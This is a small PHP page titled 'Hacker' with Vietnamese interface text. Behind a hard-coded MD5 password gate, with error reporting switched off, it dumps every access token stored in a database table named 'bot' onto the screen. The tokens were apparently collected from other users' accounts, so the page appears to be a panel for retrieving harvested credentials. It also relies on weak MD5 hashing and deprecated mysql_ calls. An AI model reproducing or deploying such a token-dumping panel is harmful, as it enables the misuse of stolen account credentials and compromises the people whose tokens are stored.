<meta charset="utf-8">
<title>Hacker</title>
<?php
session_start();
error_reporting(0);
include './config.php';
$id = 'f8980e67781b65a451346fffd81e5627';
if(isset($_POST['check'])){
$_POST['check'] = md5($_POST['check']);
if($_POST['check']==$id){
$_SESSION['check'] = $_POST['check'];
}else{
$thongbao ='Sai mã xác nhận!';
}
}
if($_SESSION['check'] != $id)
{

echo'
Từ chối truy cập! Vui lòng nhập mã xác nhận<br />
<form action ="#" method="post">
<font color="red">'.$thongbao.'</font><br />
<input type ="password" name ="check">
<input type ="submit" value="xác nhận">
</form>
';
exit;
}
$result = mysql_query("SELECT * FROM bot");
if($result){
while($row = mysql_fetch_array($result))
  {
$token = $row[access_token];
echo"$token <br>";
}
}
?>